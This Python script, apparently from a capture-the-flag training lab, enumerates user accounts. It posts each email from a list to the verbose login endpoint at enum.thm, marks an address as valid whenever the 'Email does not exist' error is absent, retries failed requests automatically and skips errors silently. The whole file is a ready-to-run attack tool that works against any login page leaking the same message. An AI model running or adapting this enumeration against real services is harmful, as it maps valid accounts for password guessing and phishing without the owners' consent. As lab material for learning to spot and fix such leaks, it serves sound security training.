import sys
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

URL = "http://enum.thm/labs/verbose_login/functions.php"
INVALID_ERROR_TEXT = "Email does not exist"

def make_session():
    s = requests.Session()
    retries = Retry(
        total=2, connect=2, read=2,
        backoff_factor=0.4,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["POST"],
        raise_on_status=False,
    )
    s.mount("http://", HTTPAdapter(max_retries=retries))
    s.mount("https://", HTTPAdapter(max_retries=retries))
    return s

def check_email(session, email):
    headers = {
        "Host": "enum.thm",
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://enum.thm",
        "Referer": "http://enum.thm/labs/verbose_login/",
        "Connection": "close",
    }
    data = {"username": email, "password": "password", "function": "login"}
    r = session.post(URL, headers=headers, data=data, timeout=(5, 10))
    return r.json()

def enumerate_emails(email_file):
    sess = make_session()
    with open(email_file, "r") as fh:
        for raw in fh:
            email = raw.strip()
            if not email:
                continue
            try:
                resp = check_email(sess, email)
            except Exception:
                # Silently skip network/timeout/parse errors (no [ERROR] prints)
                continue

            # Only print INVALID or VALID lines
            if resp.get("status") == "error" and INVALID_ERROR_TEXT in resp.get("message", ""):
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)
    enumerate_emails(sys.argv[1])
